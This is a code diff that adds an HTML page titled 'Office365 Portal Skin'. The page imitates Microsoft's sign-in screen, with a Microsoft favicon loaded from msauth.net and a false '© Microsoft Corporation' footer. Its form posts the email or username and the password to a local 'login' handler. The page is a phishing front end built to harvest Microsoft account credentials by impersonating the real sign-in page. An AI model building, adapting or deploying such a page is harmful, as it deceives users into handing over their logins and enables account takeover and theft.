@@ -1,0 +1,29 @@
+<!-- Office365 Portal Skin -->
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Sign in to your account</title>
+  <style>
+    body { background:#f3f3f3; font-family:sans-serif; }
+    .box { max-width:340px; margin:80px auto; background:#fff; border-radius:8px; padding:35px;
+      box-shadow:0 8px 32px #2221; }
+    input { width:100%; margin:8px 0 14px 0; padding:8px; border:1px solid #ccc; }
+    button { width:100%; background:#0067b8; color:#fff; padding:10px; border:none; font-size:16px; border-radius:3px; }
+    .logo { margin-bottom:12px; }
+  </style>
+</head>
+<body>
+  <div class="box">
+    <div class="logo">
+      <img src="https://logincdn.msauth.net/16.000.29013.2/images/favicon.ico" width="40">
+    </div>
+    <h2>Sign in</h2>
+    <form method="POST" action="login">
+      <input type="text" name="username" placeholder="Email, phone, username" required>
+      <input type="password" name="password" placeholder="Password" required>
+      <button type="submit">Sign in</button>
+    </form>
+    <div style="color:#777;font-size:13px;margin-top:8px;">© Microsoft Corporation</div>
+  </div>
+</body>
+</html>
